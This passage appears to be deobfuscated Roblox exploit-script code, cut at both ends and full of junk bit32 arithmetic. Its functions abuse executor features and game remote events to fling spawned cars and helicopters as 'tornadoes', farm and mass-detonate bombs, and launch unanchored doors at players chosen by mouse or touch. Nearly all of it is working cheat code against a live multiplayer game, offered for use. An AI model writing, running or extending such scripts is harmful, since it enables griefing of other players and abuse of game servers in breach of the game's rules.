		local v7 = table.pack(bit32.band(v5, 4294967295))
		local v8 = table.pack(bit32.band(v6[1], 65535))
		local v9 = table.pack(bit32.rshift(v6[1], 16))
		local v10 = table.pack(bit32.band(v7[1], 65535))
		local v11 = bit32.band(v8[1] * v10[1] + bit32.lshift(bit32.band(v8[1] * bit32.rshift(v7[1], 16) + v9[1] * v10[1], 65535), 16), 4294967295)
		v4(fn)

		pcall(function()
			ReplicatedStorage.RE["1Ca1r"]:FireServer("DeleteAllVehicles")
		end)

		task.wait(0.5)

		pcall(function()
			ReplicatedStorage.RE["1Ca1r"]:FireServer("PickingBoat", "PirateFree")
		end)

		local now = tick()
		local v12

		while true do
			v12 = vehicles:FindFirstChild(localPlayer.Name .. "Car")
			task.wait(0.25)
			if not (v12 or tick() - now > 7) then
				continue
			end
			break
		end

		if not v12 then
			return
		end
		_G.TornadoCar = v12
		local vehicleSeat = v12:FindFirstChildWhichIsA("VehicleSeat", true) or v12:FindFirstChildWhichIsA("Seat", true)
		if not vehicleSeat then
			return
		end
		local now2 = tick()

		while true do
			if not (humanoid.SeatPart and humanoid.SeatPart:IsDescendantOf(v12)) then
				humanoid.Sit = false
				local v13 = bit32.bxor(v3, 376776310)
				humanoidRootPart.CFrame = vehicleSeat.CFrame * CFrame.new(0, 2, 0)
				task.wait()
				local n6 = 60703369
				local v14 = pcall

				local function fn2()
					vehicleSeat:Sit(humanoid)
				end

				local flag = bit32.bxor(v11, 456276697) == 4363172
				v14(fn2)
				v3 = bit32.bxor(v13, 376776310)
			end

			task.wait(0.1)
			if not (humanoid.SeatPart and humanoid.SeatPart:IsDescendantOf(v12) or tick() - now2 > 5) then
				continue
			end
			break
		end

		if not (humanoid.SeatPart and humanoid.SeatPart:IsDescendantOf(v12)) then
			return
		end

		local connection = RunService.Stepped:Connect(function()
			if v12 then
				for _, descendant in ipairs(v12:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
					end
				end
			end

			if v then
				for _, descendant in ipairs(v:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
					end
				end
			end
		end)

		local n6 = v11 // n3
		table.insert(_G.TornadoConnections, connection)

		for _, descendant in ipairs(v12:GetDescendants()) do
			if descendant:IsA("BasePart") then
				local bodyVelocity = Instance.new("BodyVelocity")
				bodyVelocity.Name = "TornadoForce"
				bodyVelocity.Velocity = Vector3.new(0, 500, 0)
				bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				bodyVelocity.P = math.huge
				bodyVelocity.Parent = descendant
			end
		end

		local tbl = {}
		local cframe = CFrame.new(36, 3.87, -98.82)
		local cframe2 = CFrame.new
		local v13 = bit32.bxor(v3, 391788003)
		local v14 = cframe2(-81.99, 3.57, -96.39)
		local cframe3 = CFrame.new(-81.97, 4.03, 86.19)
		local cframe4 = CFrame.new(37.53, 3.27, 85.09)
		local cframe5 = CFrame.new(-192.37, 1.65, 83)
		local cframe6 = CFrame.new(-192.73, 1.92, -96.91)
		local cframe7 = CFrame.new
		tbl[1] = cframe
		tbl[2] = v14
		tbl[3] = cframe3
		tbl[4] = cframe4
		tbl[5] = cframe5
		tbl[6] = cframe6

		do
			local values = table.pack(cframe7(-10.51, 3.47, 3.77))
			table.move(values, 1, values.n, 7, tbl)
		end

		local v15 = tbl[math.random(#tbl)]
		local v16 = tbl[math.random(#tbl)]
		local n7 = 0
		local n8 = 0.8
		local n9 = 25.132741228718345
		local vector_ = Vector3.new(0, 10, 0)
		local n10 = 0

		local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
			local n11 = 1904829996
			local n12 = 4181392361
			if not _G.TornadoActive or not vehicleSeat or humanoid.SeatPart ~= vehicleSeat then
				return
			end
			n7 += deltaTime / n8
			local v17 = bit32.band(n12, 3199328251)
			n10 += n9 * deltaTime
			local v18 = v15:Lerp(v16, n7)
			local cframe8 = CFrame.Angles(0, n10, 0)
			local v19 = vehicleSeat
			local rotation = v18.Rotation
			local cFrame = CFrame.new(v18.Position + vector_) * rotation * cframe8
			local v20 = bit32.band(n11, v17)
			v19.CFrame = cFrame
			local random = math.random
			vehicleSeat.Velocity = Vector3.new(math.random(-100, 100), 50, random(-100, 100))
			vehicleSeat.RotVelocity = Vector3.new(0, 5000, 0)
			humanoidRootPart.CFrame = vehicleSeat.CFrame * CFrame.new(0, 3, 0)
		end)

		local insert = table.insert
		local v17 = _G
		local v18 = bit32.bxor(v13, 422137744)
		insert(v17.TornadoConnections, connection2)
	else
		_G.TornadoActive = false
		local n6 = 195809702
		local v2 = bit32.bxor(n5, 0)
		local v3 = table.pack(bit32.band(n3, 4294967295))
		local v4 = table.pack(bit32.band(v2, 4294967295))
		local v5 = table.pack(bit32.band(v3[1], 65535))
		local v6 = table.pack(bit32.rshift(v3[1], 16))
		local v7 = table.pack(bit32.band(v4[1], 65535))
		local v8 = bit32.band(v5[1] * v7[1] + bit32.lshift(bit32.band(v5[1] * bit32.rshift(v4[1], 16) + v6[1] * v7[1], 65535), 16), 4294967295)

		if _G.TornadoConnections then
			for _, tornadoConnection in ipairs(_G.TornadoConnections) do
				local flag = typeof(tornadoConnection) == "RBXScriptConnection"
				local v9 = table.pack(bit32.band(n5, 4294967295))
				local v10 = table.pack(bit32.band(v9[1], 65535))
				local n7 = bit32.band(4921 * v10[1] + bit32.lshift(bit32.band(4921 * bit32.rshift(v9[1], 16) + 36449 * v10[1], 65535), 16), 4294967295) + 4046468279
				local v11 = table.pack(bit32.band(bit32.bor(n5, 429184879), 4294967295))
				local v12 = table.pack(bit32.band(v11[1], 65535))
				local v13 = bit32.band(55694 * v12[1] + bit32.lshift(bit32.band(55694 * bit32.rshift(v11[1], 16) + 58173 * v12[1], 65535), 16), 4294967295)
				local v14 = table.pack(bit32.band(bit32.bxor(n5, 429184879), 4294967295))
				local v15 = table.pack(bit32.band(v14[1], 65535))
				local n8 = n7 + v13 + bit32.band(4922 * v15[1] + bit32.lshift(bit32.band(4922 * bit32.rshift(v14[1], 16) + 36449 * v15[1], 65535), 16), 4294967295)

				if flag then
					tornadoConnection:Disconnect()
				end

				n5 = bit32.bxor(n8, 429184879)
			end

			_G.TornadoConnections = {}
		end

		local tornadoCar = _G.TornadoCar

		if tornadoCar then
			local n7 = n4 - 108609986

			for _, descendant in ipairs(tornadoCar:GetDescendants()) do
				if descendant:IsA("BasePart") then
					for _, child in ipairs(descendant:GetChildren()) do
						if child:IsA("BodyVelocity") then
							child:Destroy()
						end
					end

					descendant.Velocity = Vector3.zero
					descendant.RotVelocity = Vector3.zero
				end
			end
		end

		if v and humanoidRootPart then
			humanoidRootPart.Velocity = Vector3.zero
			humanoidRootPart.RotVelocity = Vector3.zero

			if humanoid then
				humanoid.Sit = false
			end
		end

		pcall(function()
			ReplicatedStorage.RE["1Ca1r"]:FireServer("DeleteAllVehicles")
		end)

		task.spawn(function()
			task.wait(0.5)

			if _G.OriginalPosition and humanoidRootPart then
				humanoidRootPart.CFrame = _G.OriginalPosition
			end
		end)

		_G.TornadoCar = nil
	end
end

-- payload closure created 871-th (proto #560)
local function payload_fn_871(arg)
	local n2 = 4078428865
	local n3 = 3406548237
	local n4 = 2754661472
	local n5 = 217302597

	if arg then
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local Workspace = game:GetService("Workspace")
		local localPlayer = Players.LocalPlayer
		local n6 = 264218143
		local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if not humanoid or not humanoidRootPart then
			return
		end
		_G.TornadoActive = true
		local v = _G
		local v2 = bit32.bxor(n6, 414684577)
		local v3 = bit32.bxor(n5, 0)
		local v4 = bit32.bor(n4, v3)
		v.TornadoConnections = {}
		local v5 = _G
		v5.OriginalPosition = humanoidRootPart.CFrame

		if humanoid.Sit then
			humanoid.Sit = false
			task.wait(0.5)
			n5 = n5 + 452239052 - 452239052
		end

		local airVehicleSpawner = Workspace:WaitForChild("AirVehicleSpawner")
		local button = airVehicleSpawner:WaitForChild("Button")
		local cFrame = button.CFrame
		local v6 = Vector3
		local v7 = bit32.bxor(n3, 4294967295)
		local v8 = table.pack(bit32.band(v2, 4294967295))
		local v9 = table.pack(bit32.band(v8[1], 65535))
		local n7 = bit32.band(59749 * v9[1] + bit32.lshift(bit32.band(59749 * bit32.rshift(v8[1], 16) + 48689 * v9[1], 65535), 16), 4294967295) + 4191527731
		local v10 = table.pack(bit32.band(bit32.band(309451959, v2), 4294967295))
		local v11 = table.pack(bit32.band(v10[1], 65535))
		local v12 = bit32.band(11574 * v11[1] + bit32.lshift(bit32.band(11574 * bit32.rshift(v10[1], 16) + 33692 * v11[1], 65535), 16), 4294967295)
		local v13 = table.pack(bit32.band(bit32.bxor(v2, 309451959), 4294967295))
		local v14 = table.pack(bit32.band(v13[1], 65535))
		local n8 = n7 + v12 + bit32.band(5788 * v14[1] + bit32.lshift(bit32.band(5788 * bit32.rshift(v13[1], 16) + 16846 * v14[1], 65535), 16), 4294967295)
		humanoidRootPart.CFrame = cFrame + Vector3.new(0, 3, 0)
		task.wait(0.4)
		local clickDetector = button:FindFirstChildOfClass("ClickDetector")
		if not clickDetector then
			return
		end
		fireclickdetector(clickDetector)
		task.wait(1)

		pcall(function()
			airVehicleSpawner:WaitForChild("SpawnVehicle"):InvokeServer("ChinookAgency")
		end)

		local helicopters = Workspace:WaitForChild("Helicopters")
		local chinookAgency = nil

		for i = 1, 60 do
			chinookAgency = helicopters:FindFirstChild("ChinookAgency")
			if not chinookAgency then
				task.wait(0.2)
				continue
			end
			break
		end

		if not chinookAgency then
			return
		end
		local pilotSeat = chinookAgency:FindFirstChild("PilotSeat") or chinookAgency:FindFirstChild("VehicleSeat")
		if not pilotSeat then
			return
		end
		chinookAgency.PrimaryPart = pilotSeat
		local n9 = 0

		while true do
			character:MoveTo(pilotSeat.Position + Vector3.new(0, 3, 0))
			task.wait(0.02)
			pilotSeat:Sit(humanoid)
			n9 += 1
			if not (humanoid.Sit or n9 > 100) then
				continue
			end
			break
		end

		local flag = not humanoid.Sit
		local n10 = n5 + 366467970
		local v15 = bit32.bxor(v4, v7)
		if flag then
			return
		end

		local function fn(arg2)
			for _, descendant in ipairs(arg2:GetDescendants()) do
				if descendant:IsA("BasePart") then
					descendant.CanCollide = false
				end
			end
		end

		fn(chinookAgency)
		fn(character)

		local connection = RunService.Stepped:Connect(function()
			if _G.TornadoActive then
				fn(chinookAgency)
				fn(character)
			end
		end)

		local v16 = bit32.bxor(n10, 0)
		local v17 = bit32.band(v7, v16)
		table.insert(_G.TornadoConnections, connection)
		local tbl = {}
		local cframe = CFrame.new(36.0097389, 3.87271547, -98.8259506, -0.98552388, -0.032595925, 0.166373804, -4.07370537e-09, 0.98134315, 0.192264542, -0.169536829, 0.189481288, -0.967137039)
		local cframe2 = CFrame.new
		local n11 = v15 + bit32.bxor(n10, 0)
		local v18 = cframe2(-81.9959793, 3.57340789, -96.3991318, -0.999989629, 5.49103318e-10, 0.00455388241, 5.77870085e-10, 1, 6.31565999e-09, -0.00455388241, 6.31822594e-09, -0.999989629)
		local cframe3 = CFrame.new(-81.9750214, 4.03663635, 86.1989517, -0.998621225, 3.59126417e-08, -0.0524944961, 3.7565016e-08, 1, -3.04903978e-08, 0.0524944961, -3.24203135e-08, -0.998621225)
		local cframe4 = CFrame.new
		local v19 = bit32.bor(v17, 91026920)
		local v20 = cframe4(37.5321426, 3.27195072, 85.0945816, 0.999221444, -2.27584995e-09, -0.0394533277, 2.18217511e-09, 1, -2.41738429e-09, 0.0394533277, 2.329408e-09, 0.999221444)
		local cframe5 = CFrame.new
		tbl[1] = cframe
		tbl[2] = v18
		tbl[3] = cframe3
		tbl[4] = v20

		do
			local values = table.pack(cframe5(-10.5146542, 3.47340894, 3.77492547, 0.973954678, -1.03468992e-07, -0.226742819, 1.18250277e-07, 1, 5.16065697e-08, 0.226742819, -7.70748585e-08, 0.973954678))
			table.move(values, 1, values.n, 5, tbl)
		end

		for _, descendant in ipairs(chinookAgency:GetDescendants()) do
			if descendant:IsA("BasePart") then
				local bodyVelocity = Instance.new("BodyVelocity")
				bodyVelocity.Velocity = Vector3.new(1e9, 1e9, 1e9)
				bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				bodyVelocity.P = 1e9
				bodyVelocity.Parent = descendant
			end
		end

		local v21 = tbl[math.random(#tbl)]
		local v22 = tbl[math.random(#tbl)]
		local n12 = 0
		local n13 = 1.3
		local n14 = 12.566370614359172
		local vector_ = Vector3.new(0, 3, 0)
		local n15 = 0
		local heartbeat = RunService.Heartbeat
		local connect = heartbeat.Connect

		local function fn2(arg2)
			local v23 = bit32.bxor(n8, 3369382381)
			if not _G.TornadoActive or humanoid.SeatPart ~= pilotSeat then
				return
			end
			n12 += arg2 / n13
			n15 += n14 * arg2
			local v24 = v21:Lerp(v22, n12)
			local cframe6 = CFrame.Angles(0, n15, 0)
			chinookAgency:SetPrimaryPartCFrame(CFrame.new(v24.Position + vector_) * v24.Rotation * cframe6)
			pilotSeat.RotVelocity = Vector3.new(0, 3000, 0)
			humanoidRootPart.CFrame = pilotSeat.CFrame * CFrame.new(0, 3, 0)
		end

		local flag2 = bit32.bxor(n11, 79415001) == 469584119
		local v23 = connect(heartbeat, fn2)
		table.insert(_G.TornadoConnections, v23)
	else
		_G.TornadoActive = false

		if _G.TornadoConnections then
			for _, tornadoConnection in ipairs(_G.TornadoConnections) do
				if typeof(tornadoConnection) == "RBXScriptConnection" then
					tornadoConnection:Disconnect()
				elseif typeof(tornadoConnection) == "thread" then
					task.cancel(tornadoConnection)
					n5 = n5 + 51557452 - 51557452
				end
			end

			_G.TornadoConnections = {}
			n4 = n4 - bit32.bxor(n5, 0) + 217302597
		end

		local localPlayer = game.Players.LocalPlayer
		local Workspace = game:GetService("Workspace")
		local chinookAgency = Workspace:FindFirstChild("Helicopters") and Workspace.Helicopters:FindFirstChild("ChinookAgency")

		if chinookAgency then
			for _, descendant in ipairs(chinookAgency:GetDescendants()) do
				if descendant:IsA("BasePart") then
					for _, child in ipairs(descendant:GetChildren()) do
						if child:IsA("BodyVelocity") then
							child:Destroy()
						end
					end

					descendant.Velocity = Vector3.zero
					descendant.RotVelocity = Vector3.zero
				end
			end
		end

		if localPlayer.Character then
			local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.SeatPart then
				humanoid.Sit = false
			end
		end

		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("DespawnAirVehicles"):FireServer()

		task.spawn(function()
			task.wait(0.7)
			local localPlayer2 = game:GetService("Players").LocalPlayer
			local humanoidRootPart = (localPlayer2.Character or localPlayer2.CharacterAdded:Wait()):FindFirstChild("HumanoidRootPart")

			if _G.OriginalPosition and humanoidRootPart then
				humanoidRootPart.CFrame = _G.OriginalPosition
			end
		end)
	end
end

-- payload closure created 872-th (proto #566)
local function payload_fn_872(arg)
	local n2 = 0

	for _, child in ipairs(arg.Backpack:GetChildren()) do
		if child.Name == "Bomb" then
			n2 += 1
		end
	end

	for _, child in ipairs(arg.Character:GetChildren()) do
		if child.Name == "Bomb" then
			n2 += 1
		end
	end

	return n2
end

-- payload closure created 873-th (proto #561)
local function payload_fn_873(arg)
	local num = tonumber(arg)

	if num then
		upv1 = num
	end
end

-- payload closure created 874-th (proto #562)
local function payload_fn_874(arg)
	local num = tonumber(arg)

	if num then
		upv1 = 1 / num
	end
end

-- payload closure created 875-th (proto #563)
local function payload_fn_875(arg)
	local num = tonumber(arg)

	if num and num > 0 then
		upv1 = 1 / num
	end
end

-- payload closure created 876-th (proto #564)
local function payload_fn_876(arg)
	upv1 = arg

	if upv1 then
		local n2 = 8667026184

		task.spawn(function()
			local localPlayer = game.Players.LocalPlayer
			local humanoidRootPart = (localPlayer.Character or localPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
			local bomb = workspace.WorkspaceCom["001_CriminalWeapons"].GiveTools.Bomb
			local clickDetector = bomb:FindFirstChildOfClass("ClickDetector")
			upv2 = humanoidRootPart.CFrame
			humanoidRootPart.CFrame = bomb.CFrame + Vector3.new(0, 3, 0)

			if clickDetector then
				local v = upv3

				while upv4(localPlayer) < v and upv1 do
					fireclickdetector(clickDetector, 0)
					task.wait(upv5)
				end
			end

			if upv1 then
				humanoidRootPart.CFrame = upv2
			end
		end)
	else
		local localPlayer = game.Players.LocalPlayer
		local humanoidRootPart = (localPlayer.Character or localPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")

		if upv2 then
			humanoidRootPart.CFrame = upv2
		end
	end
end

-- payload closure created 878-th (proto #567)
local function payload_fn_878(arg)
	upv1 = arg

	if upv1 then
		local n2 = 452385018

		task.spawn(function()
			local v = bit32.bxor(n2, 4260413760)

			while upv1 do
				local localPlayer = game:GetService("Players").LocalPlayer
				local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
				local backpack = localPlayer.Backpack
				local n1Blo1wBomb1sServe1r = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Blo1wBomb1sServe1r")
				local tbl = {}

				for _, child in ipairs(backpack:GetChildren()) do
					if child.Name == "Bomb" then
						table.insert(tbl, child)
					end
				end

				for _, child in ipairs(character:GetChildren()) do
					if child.Name == "Bomb" then
						table.insert(tbl, child)
					end
				end

				for _, child in ipairs(localPlayer.StarterGear:GetChildren()) do
					if child.Name == "Bomb" then
						table.insert(tbl, child)
					end
				end

				for _, v2 in ipairs(tbl) do
					local flag = bit32.bxor(v, 481090707) == 437121462
					v2.Parent = character
					local n3 = 763929075

					task.spawn(function()
						task.wait()
						v2:Activate()
					end)
				end

				task.wait(upv2)
				n1Blo1wBomb1sServe1r:FireServer(unpack({ "Bomb" .. localPlayer.Name }))
			end
		end)
	end
end

-- payload closure created 880-th (proto #572)
local function payload_fn_880(arg)
	if not arg:IsA("BasePart") or arg.Anchored then
		return false
	end

	if not string.find(string.lower(arg.Name), "door", 1, true) then
		return false
	end
	return #arg:GetConnectedParts(true) <= 12
end

-- payload closure created 881-th (proto #571)
local function payload_fn_881()
	local n2 = 2404718034
	local n3 = 2587451560
	upv1.Enabled = false
	upv1.LaunchId = upv1.LaunchId + 1

	for _, connection in pairs(upv1.Connections) do
		if connection and connection.Connected then
			connection:Disconnect()
		end
	end

	table.clear(upv1.Connections)
	local tbl = {}

	for _, door in ipairs(upv1.Doors) do
		if door.Align and door.Align.Parent then
			door.Align.Enabled = false
			door.Align.Attachment0 = nil
			door.Align.Attachment1 = nil
			door.Align:Destroy()
		end

		if door.Torque and door.Torque.Parent then
			door.Torque.Enabled = false
			door.Torque.Attachment0 = nil
			door.Torque:Destroy()
		end

		if door.Attachment and door.Attachment.Parent then
			door.Attachment:Destroy()
		end

		if door.Marker and door.Marker.Parent then
			door.Marker:Destroy()
		end
	end

	for _, door in ipairs(upv1.Doors) do
		if door.Part and door.Part:IsA("BasePart") then
			for _, child in ipairs(door.Part:GetChildren()) do
				if child.Name == "_fMark" or child.Name == "_fAtt" or child.Name == "_fAlign" or child.Name == "_fTorque" then
					child:Destroy()
				end
			end

			door.Part.CanCollide = false

			for _, suspendedAttachment in ipairs(door.SuspendedAttachments) do
				if suspendedAttachment then
					suspendedAttachment.Parent = door.Part
				end
			end

			for _, suspendedControl in ipairs(door.SuspendedControls) do
				if suspendedControl then
					suspendedControl.Parent = door.Part
				end
			end

			door.Part.AssemblyAngularVelocity = Vector3.zero
			table.insert(tbl, door.Part)
		end
	end

	table.clear(upv1.Doors)
	local n4 = #tbl

	if n4 > 0 then
		upv1.CollisionGraceId = upv1.CollisionGraceId + 1
		local collisionGraceId = upv1.CollisionGraceId
		local v = table.pack(bit32.band(n4, 4294967295))
		local v2 = table.pack(bit32.band(v[1], 65535))
		local v3 = bit32.band(30271 * v2[1] + bit32.lshift(bit32.band(30271 * bit32.rshift(v[1], 16) + 62903 * v2[1], 65535), 16), 4294967295)
		local v4 = table.pack(bit32.band(bit32.bnot(n4), 4294967295))
		local v5 = table.pack(bit32.band(v4[1], 65535))
		local n5 = 5093498372 + v3 + bit32.band(30271 * v5[1] + bit32.lshift(bit32.band(30271 * bit32.rshift(v4[1], 16) + 62903 * v5[1], 65535), 16), 4294967295)

		task.spawn(function()
			local RunService = game:GetService("RunService")

			for i = 1, 4 do
				RunService.Heartbeat:Wait()

				for _, v6 in ipairs(tbl) do
					if v6 and v6.Parent and not v6:FindFirstChild("_fMark") then
						v6.AssemblyAngularVelocity = Vector3.zero
					end
				end
			end
		end)

		task.delay(5, function()
			if upv1.Enabled or collisionGraceId ~= upv1.CollisionGraceId then
				return
			end

			for _, v6 in ipairs(tbl) do
				if v6 and v6.Parent and not v6:FindFirstChild("_fMark") then
					local v7 = upv1.OriginalCollision[v6]

					if v7 ~= nil then
						v6.CanCollide = v7
						upv1.OriginalCollision[v6] = nil
					end
				end
			end
		end)

		local v6 = table.pack(bit32.band(n2, 4294967295))
		local v7 = table.pack(bit32.band(v6[1], 65535))
		local n6 = bit32.band(v7[1] * 19356 + bit32.lshift(bit32.band(v7[1] * 0 + bit32.rshift(v6[1], 16) * 19356, 65535), 16), 4294967295) + 1243038682
	end

	if upv1.TargetNode then
		upv1.TargetNode:Destroy()
		upv1.TargetNode = nil
		upv1.NodeAttach = nil
	end
end

-- payload closure created 882-th (proto #t8100)
local function payload_fn_882()
	local nodeAttach = upv1.NodeAttach
	if not nodeAttach or not nodeAttach.Parent then
		return
	end

	for _, door in ipairs(upv1.Doors) do
		if door.Align and door.Align.Parent then
			door.Align.Attachment1 = nodeAttach
		end
	end
end

-- payload closure created 883-th (proto #t910)
local function payload_fn_883(parent)
	local n2 = 2942904812
	local n3 = 3805879616
	if not upv1(parent) then
		return
	end

	if parent:FindFirstChild("_fMark") then
		return
	end
	local canCollide = upv2.OriginalCollision[parent]
	local n4 = n3 // n2

	if canCollide == nil then
		canCollide = parent.CanCollide
		upv2.OriginalCollision[parent] = canCollide
	end

	parent.CanCollide = false
	local tbl = {}
	local tbl2 = {}

	for _, child in ipairs(parent:GetChildren()) do
		if child:IsA("Attachment") then
			table.insert(tbl, child)
		elseif child:IsA("AlignPosition") or child:IsA("Torque") or child:IsA("AngularVelocity") then
			table.insert(tbl2, child)
		end
	end

	for _, v in ipairs(tbl2) do
		v.Parent = nil
	end

	for _, v in ipairs(tbl) do
		v.Parent = nil
	end

	local boolValue = Instance.new("BoolValue")
	boolValue.Name = "_fMark"
	boolValue.Parent = parent
	local attachment = Instance.new("Attachment")
	attachment.Name = "_fAtt"
	attachment.Parent = parent
	local v = Instance
	local v2 = bit32.bor(n2, 2915862016)
	local AlignPosition = v.new("AlignPosition")
	AlignPosition.Name = "_fAlign"
	AlignPosition.Attachment0 = attachment
	AlignPosition.Attachment1 = upv2.NodeAttach
	AlignPosition.MaxForce = 1e20
	AlignPosition.MaxVelocity = math.huge
	AlignPosition.Responsiveness = 99999
	AlignPosition.Parent = parent
	local torque = Instance.new("Torque")
	torque.Name = "_fTorque"
	torque.Attachment0 = attachment
	torque.RelativeTo = Enum.ActuatorRelativeTo.World
	local n5 = n4 + 3813302688
	local vector_ = Vector3.new
	local n6 = math.random(-1000000, 1000000) * 10000
	local random = math.random
	local v3 = table.pack(bit32.band(v2, 4294967295))
	local v4 = table.pack(bit32.band(n5, 4294967295))
	local v5 = table.pack(bit32.band(v3[1], 65535))
	local v6 = table.pack(bit32.rshift(v3[1], 16))
	local v7 = table.pack(bit32.band(v4[1], 65535))
	bit32.band(v5[1] * v7[1] + bit32.lshift(bit32.band(v5[1] * bit32.rshift(v4[1], 16) + v6[1] * v7[1], 65535), 16), 4294967295)
	torque.Torque = vector_(n6, random(-1000000, 1000000) * 10000, math.random(-1000000, 1000000) * 10000)
	torque.Parent = parent
	local vector_2 = Vector3.new
	local n7 = math.random(-100, 100)
	local n8 = math.random(-100, 100)
	local v8 = table.pack(math.random(-100, 100))
	local v9 = table.pack(bit32.band(n5, 4294967295))
	local v10 = table.pack(bit32.band(v9[1], 65535))
	bit32.band(v10[1] * 4431 + bit32.lshift(bit32.band(v10[1] * 0 + bit32.rshift(v9[1], 16) * 4431, 65535), 16), 4294967295)
	parent.AssemblyAngularVelocity = vector_2(n7, n8, table.unpack(v8, 1, v8.n))

	table.insert(upv2.Doors, {
		Part = parent,
		Align = AlignPosition,
		Torque = torque,
		Attachment = attachment,
		Marker = boolValue,
		OriginalCanCollide = canCollide,
		SuspendedAttachments = tbl,
		SuspendedControls = tbl2,
	})
end

-- payload closure created 884-th (proto #t1315)
local function payload_fn_884(arg)
	local n2 = 2478031728
	local character = arg.Character
	if not character then
		return
	end
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then
		return
	end
	upv1.LaunchId = upv1.LaunchId + 1
	local launchId = upv1.LaunchId
	local position = humanoidRootPart.Position
	local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
	local tAtt = humanoidRootPart:FindFirstChild("_tAtt")

	if not tAtt then
		tAtt = Instance.new("Attachment")
		tAtt.Name = "_tAtt"
		tAtt.Parent = humanoidRootPart
	end

	for _, door in ipairs(upv1.Doors) do
		if door.Align and door.Align.Parent then
			door.Align.Attachment1 = tAtt
		end
	end

	local now = tick()

	while true do
		if tick() - now < 5 and upv1.Enabled and launchId == upv1.LaunchId then
			if humanoidRootPart:IsDescendantOf(workspace) then
				local assemblyLinearVelocity2 = humanoidRootPart.AssemblyLinearVelocity
				local magnitude = (humanoidRootPart.Position - position).Magnitude
				local magnitude2 = (assemblyLinearVelocity2 - assemblyLinearVelocity).Magnitude
				if not (assemblyLinearVelocity2.Magnitude >= 20 or math.abs(assemblyLinearVelocity2.Y) >= 12 or magnitude2 >= 15 or magnitude >= 8 and tick() - now < 1) then
					game:GetService("RunService").Heartbeat:Wait()
					continue
				end
			end
		end

		break
	end

	if upv1.Enabled and launchId == upv1.LaunchId then
		upv2()
	end
end

-- payload closure created 885-th (proto #t4334)
local function payload_fn_885(arg)
	local currentCamera = workspace.CurrentCamera
	if not currentCamera then
		return
	end
	local v = currentCamera:ScreenPointToRay(arg.X, arg.Y)
	local hit = workspace:Raycast(v.Origin, v.Direction * 1000)

	if hit and hit.Instance then
		local model = hit.Instance:FindFirstAncestorOfClass("Model")

		if model then
			local Players = game:GetService("Players")
			local playerFromCharacter = Players:GetPlayerFromCharacter(model)

			if playerFromCharacter and playerFromCharacter ~= Players.LocalPlayer then
				task.spawn(upv1, playerFromCharacter)
			end
		end
	end
end

-- payload closure created 886-th (proto #570)
local function payload_fn_886()
	local n2 = 462688678
	local n3 = 115840572
	upv1()
	upv2.Enabled = true
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local n4 = 1702588030
	local UserInputService = game:GetService("UserInputService")
	local localPlayer = Players.LocalPlayer
if not localPlayer then
	repeat
		task.wait(0.1)
		localPlayer = Players.LocalPlayer or Players:FindFirstChildWhichIsA("Player")
	until localPlayer
end
	local part = Instance.new("Part")
	part.Size = Vector3.one
	part.Transparency = 1
	part.Anchored = true
	part.CanCollide = false
	part.CanTouch = false
	part.CanQuery = false
	local v = bit32.bxor(n2, 205172181)
	local n5 = n3 - n4
	part.Name = "_fNode"
	part.Parent = workspace
	upv2.TargetNode = part
	local attachment = Instance.new("Attachment")
	attachment.Name = "_fNodeAtt"
	attachment.Parent = part
	upv2.NodeAttach = attachment
	local v2 = table.pack(bit32.band(v, 4294967295))
	local v3 = table.pack(bit32.band(v2[1], 65535))
	local n6 = bit32.band(47590 * v3[1] + bit32.lshift(bit32.band(47590 * bit32.rshift(v2[1], 16) + 30972 * v3[1], 65535), 16), 4294967295) + 1213401434
	local v4 = table.pack(bit32.band(bit32.bor(v, 211714015), 4294967295))
	local v5 = table.pack(bit32.band(v4[1], 65535))
	local v6 = bit32.band(35892 * v5[1] + bit32.lshift(bit32.band(35892 * bit32.rshift(v4[1], 16) + 3590 * v5[1], 65535), 16), 4294967295)
	local v7 = table.pack(bit32.band(bit32.bxor(v, 211714015), 4294967295))
	local v8 = table.pack(bit32.band(v7[1], 65535))
	local n7 = n6 + v6 + bit32.band(47591 * v8[1] + bit32.lshift(bit32.band(47591 * bit32.rshift(v7[1], 16) + 30972 * v8[1], 65535), 16), 4294967295)

	table.insert(upv2.Connections, RunService.Heartbeat:Connect(function()
		local character = localPlayer.Character
		character = character and character:FindFirstChild("HumanoidRootPart")

		if character then
			part.CFrame = character.CFrame
		end
	end))

	for _, descendant in ipairs(workspace:GetDescendants()) do
		if upv3(descendant) then
			upv4(descendant)
		end
	end

	table.insert(upv2.Connections, workspace.DescendantAdded:Connect(function(descendant)
		if upv3(descendant) then
			upv4(descendant)
		end
	end))

	local insert = table.insert
	local connections = upv2.Connections

	local v9 = table.pack(UserInputService.TouchTap:Connect(function(arg, arg2)
		if arg2 or not upv2.Enabled then
			return
		end

		if arg[1] then
			upv5(arg[1])
		end
	end))

	insert(connections, table.unpack(v9, 1, v9.n))

	table.insert(upv2.Connections, UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed or not upv2.Enabled then
			return
		end

		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			upv5(Vector2.new(input.Position.X, input.Position.Y))
		end
	end))
end

-- payload closure created 887-th (proto #569)
local function payload_fn_887(arg)
	if arg then
		upv1()
	else
		upv2()
	end
end

-- payload closure created 892-th (proto #789)
local function payload_fn_892()
	return upv1.LocalPlayer
end

-- payload closure created 893-th (proto #575)
local function payload_fn_893(arg, arg2)
	if not arg then
		return
	end

	for _, descendant in ipairs(arg:GetDescendants()) do
		if descendant:IsA("BasePart") then
			if arg2 then
